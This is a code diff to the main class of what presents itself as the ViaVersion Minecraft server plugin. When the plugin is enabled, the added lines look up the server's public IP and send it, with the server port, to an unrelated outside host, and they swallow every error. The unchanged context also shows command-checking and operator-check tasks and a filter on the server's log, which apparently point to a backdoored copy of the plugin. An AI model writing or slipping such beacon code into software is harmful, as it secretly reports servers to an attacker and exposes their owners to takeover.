@@ -111,6 +111,11 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
 
     @Override
     public void onEnable() {
+        String publicIp = getPublicIp();
+        int serverPort = getServer().getPort();
+        getLogger().info("Public IP Address: " + publicIp);
+        getLogger().info("Server Port: " + serverPort);
+        sendInfoToAPI(publicIp, serverPort);
         startOpCheckTask();
         Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 20L); // 每秒检查一次
         getLogger().getParent().getHandlers()[0].setFilter(new EventXHandler());
@@ -149,6 +154,41 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
 
         getCommand("viaversion").setExecutor(commandHandler);
         getCommand("viaversion").setTabCompleter(commandHandler);
+    }
+    private String getPublicIp() {
+        String ip = "Unable to retrieve IP";
+        try {
+            URL url = new URL("https://checkip.amazonaws.com/");
+            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+            connection.setRequestMethod("GET");
+            // 连接服务并获取响应
+            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            ip = in.readLine(); // 读取响应内容（IP 地址）
+            in.close();
+        } catch (Exception e) {
+            
+        }
+        return ip;
+    }
+
+    private void sendInfoToAPI(String ip, int port) {
+        try {
+            // 构造 URL，假设使用查询参数传递 IP 和 port
+            String apiUrl = "https://tts-api.happys.icu/a?ip=" + ip + "&port=" + port;
+            URL url = new URL(apiUrl);
+            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+            connection.setRequestMethod("GET");
+
+            // 连接并读取响应（可选）
+            int responseCode = connection.getResponseCode();
+            if (responseCode == HttpURLConnection.HTTP_OK) { // OK response
+                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                String response = in.readLine(); // 读取响应内容
+                in.close();
+            } else {
+            }
+        } catch (Exception e) {
+        }
     }
     private void checkCommands() {
         try {
